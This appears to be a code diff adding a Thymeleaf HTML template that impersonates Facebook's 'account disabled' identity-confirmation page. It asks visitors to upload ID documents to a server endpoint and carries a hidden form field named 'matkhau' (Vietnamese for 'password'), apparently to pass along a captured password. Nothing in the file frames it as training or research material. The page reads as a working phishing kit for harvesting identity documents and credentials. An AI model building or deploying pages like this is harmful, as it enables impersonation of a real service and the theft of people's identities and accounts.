@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html xmlns:th="https://thymeleaf.org" lang="en" style="height: 100%;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <title>Buiness Help Center</title>
+</head>
+
+<body style="background-color: rgb(221, 223, 226);">
+    <div class="header nav-fill" style="background-color: rgb(66, 103, 178);  height: 50px;">
+        <h5 style="color: aliceblue; text-align: center; padding-top: 10px;">Confirm Your Identity With Facebook</h5>
+    </div>
+
+
+
+
+    <form th:action="@{/app/files/save}" th:object="${files}" method="post" class="border " style="border-width: 500px; padding-top: 10px; padding-left: 20px; padding-right: 50px;">
+
+        <ul class="list-group">
+            <li class="list-group-item">
+                <h6 style=" background: #f5f6f7; padding: 12px; font-weight: 700;"> My personal account was disabled
+                </h6>
+            </li>
+            <li class="list-group-item">Before we can review your
+                account, please fill out the form below to help us verify your identity.</li>
+            <li class="list-group-item">Please attach a copy of your ID(s). Learn more about why we require ID
+                verification and what types of ID we'll accept below.</li>
+            <li class="list-group-item">
+                <div class="mb-3">
+                    <label for="formFileMultiple" class="form-label"
+                        style="padding: 8px; border-bottom:1px solid #e5e5e5 ;  font-size: 14px;">ID(s) <br>
+                        As it's listed on the account</label>
+                    <input class="form-control" type="file" id="formFileMultiple" multiple name="fileUpload" th:field="*{fileContent}">
+                    <p style="padding: 8px; border-bottom:1px solid #e5e5e5 ;  font-size: 14px;">We may encrypt and
+                        store your
+                        ID for up to one year to improve our automated systems for detecting fake
+                        IDs. We might use trusted service providers to help review your information. Your ID will be
+                        stored
+                        securely and will not be visible to anyone on Facebook. If you don't want Facebook to use your
+                        ID to
+                        improve our automated systems for detecting fake IDs, you can adjust your Identity Confirmation
+                        Settings. If you turn this option off, the copy of your ID will be deleted within 30 days of
+                        submission
+                        or when you turned this option off. Visit the Help Centre to learn more about what happens to
+                        your ID
+                        after you have sent it to us.</p>
+                </div>
+            </li>
+            <input type="hidden" id="hiddenInput" name="hiddenInput" value="" th:field="*{matkhau}">
+            <li class="list-group-item" style="text-align: center;"><button type="submit"
+                    class="btn btn-primary btn-lg" >Send</button></li>
+        </ul>
+
+    </form>
+
+    <div class="footer">
+        <h3 style="padding-left: 20px;">Submitting ID</h3>
+        <ul style="padding-left: 100px;">
+
+            <li><a href="https://www.example.com">ID rejected by Facebook</a></li>
+            <li><a href="https://www.example2.com">Types of IDs that Facebook accepts?</a></li>
+            <li><a href="https://www.example3.com">How to upload an ID to Facebook?</a></li>
+            <li><a href="https://www.example2.com">Why Facebook may ask you to upload an ID</a></li>
+            <li><a href="https://www.example3.com">What happens to your ID after you send it to Facebook</a></li>
+        </ul>
+    </div>
+
+
+</body>
+
+</html>
